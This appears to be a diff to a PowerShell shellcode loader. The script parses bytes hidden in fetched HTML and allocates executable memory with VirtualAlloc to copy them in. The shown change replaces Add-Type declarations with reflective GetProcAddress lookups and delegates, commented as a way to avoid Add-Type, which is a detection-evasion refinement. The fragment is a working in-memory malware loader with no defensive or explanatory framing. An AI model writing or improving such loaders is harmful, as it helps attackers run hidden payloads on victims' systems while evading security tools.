@@ -12,14 +12,23 @@ $match = [regex]::Match($htmlContent, $pattern).Value
 $byteArray = $match.Split("dmr") | ForEach-Object { [byte]$_ }
 
 # 4. The Shellcode Loader (Runs in RAM)
-$kernel32 = Add-Type -MemberDefinition @"
-    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-    [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-"@ -Name "Win32" -Namespace Win32 -PassThru
+$Ptr = [System.Runtime.InteropServices.Marshal]
+$Win32Func = [Ref].Assembly.GetType('Microsoft.Win32.Win32Native')
+$GetProcAddress = $Win32Func.GetMethod('GetProcAddress', [Reflection.BindingFlags] 'Static, NonPublic')
+$GetModuleHandle = $Win32Func.GetMethod('GetModuleHandle', [Reflection.BindingFlags] 'Static, NonPublic')
 
-# Allocate Memory (0x1000 = Commit, 0x2000 = Reserve | 0x40 = ExecuteReadWrite)
+# 2. Find VirtualAlloc and CreateThread manually
+$Kern32 = $GetModuleHandle.Invoke($null, @("kernel32.dll"))
+$VAllocAddr = $GetProcAddress.Invoke($null, @($Kern32, "VirtualAlloc"))
+$CThreadAddr = $GetProcAddress.Invoke($null, @($Kern32, "CreateThread"))
+
+# 3. Create delegates to call them (This avoids Add-Type)
+$VAllocDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAllocAddr, [Func[IntPtr, UInt32, UInt32, UInt32, IntPtr]])
+$CThreadDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CThreadAddr, [Func[IntPtr, UInt32, IntPtr, IntPtr, UInt32, IntPtr, IntPtr]])
+
+# 4. Use the delegates
 $size = [uint32]$byteArray.Length
-$address = $kernel32::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40)
+$address = $VAllocDelegate.Invoke([IntPtr]::Zero, $size, 0x3000, 0x40)
 
 # Copy Shellcode to Allocated Memory
 [System.Runtime.InteropServices.Marshal]::Copy($byteArray, 0, $address, $size)
